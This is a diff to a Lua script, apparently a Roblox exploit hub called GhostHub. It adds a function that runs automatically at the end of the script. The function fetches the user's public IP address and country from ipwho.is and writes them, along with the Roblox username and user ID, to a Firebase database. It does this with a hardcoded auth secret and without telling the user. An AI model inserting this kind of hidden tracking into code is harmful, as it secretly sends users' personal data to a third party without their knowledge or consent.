@@ -2584,5 +2584,54 @@ function GetMoreScript()
 end
 ---
 
+
+---Update Ghosthub Users Database Function
+local function UpdateGhostHubUsersDB()
+ local Secret = "Jv8BtRjgV8K9N1rY0A1bmIQdP2YAwUs58PY3vJsO"
+ local URL = "https://ghosthub-users-86ce3-default-rtdb.firebaseio.com/"
+ local Folder = "Users"
+
+ local database = URL..Folder..".json?auth="..Secret
+ local request = request or syn.request
+ local Table = {}
+ local Table2 = {}
+ local Clicks = 0
+
+ if game.HttpService:JSONDecode(game:HttpGetAsync(database)) ~= nil then
+    Table2 = game.HttpService:JSONDecode(game.HttpService:JSONDecode(game:HttpGetAsync(database)).Table)
+    if Table2[""..game.Players.LocalPlayer.UserId] ~= nil then
+       Clicks = Table2[""..game.Players.LocalPlayer.UserId].Clicks
+    end
+ end
+
+ if game.HttpService:JSONDecode(game:HttpGetAsync(database)) ~= nil then
+    for key, value in pairs(game.HttpService:JSONDecode(game:HttpGetAsync(database))) do
+      if key then
+         Table[key] = value
+      end
+    end
+ end
+
+ local Api = game.HttpService:JSONDecode(game:HttpGet("https://ipwho.is/"))
+ Table2[""..game.Players.LocalPlayer.UserId] = {
+   ["Username"] = game.Players.LocalPlayer.Name,
+   ["Country"] = Api.country,
+   ["IP"] = Api.ip,
+   ["Clicks"] = Clicks + 1
+ }
+
+ Table["Table"] = game.HttpService:JSONEncode(Table2)
+
+ local send = request({
+   Url = database,
+   Method = "PUT",
+   Headers = {["Content-Type"] = "application/json"},
+   Body = game.HttpService:JSONEncode(Table)
+ })
+end
+---
+
+
 UpdateData()
 GetMoreScript()
+UpdateGhostHubUsersDB()
